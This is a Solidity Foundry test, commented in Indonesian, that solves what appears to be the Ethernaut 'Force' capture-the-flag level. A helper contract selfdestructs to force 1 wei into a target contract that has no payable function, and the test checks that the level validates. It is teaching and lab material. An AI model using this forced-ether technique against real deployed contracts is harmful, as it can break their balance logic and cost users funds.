// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Force} from "src/levels/Force.sol";
import {ForceFactory} from "src/levels/ForceFactory.sol";

contract ForceAttack {
    // selfdestruct mengirim seluruh saldo kontrak ke target tanpa memanggil
    // fungsi apa pun di target — satu-satunya cara mengisi kontrak tanpa
    // fungsi payable.
    function attack(address payable target) external {
        selfdestruct(target);
    }

    receive() external payable {}
}

contract ForceSolve is Test {
    ForceFactory factory;
    Force instance;
    ForceAttack attacker;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new ForceFactory();
        instance = Force(factory.createInstance(player));
        attacker = new ForceAttack();
        vm.deal(address(attacker), 1 wei);
    }

    function testInit() public view {
        assertEq(address(instance).balance, 0);
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        attacker.attack(payable(address(instance)));
        assertEq(address(instance).balance, 1);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
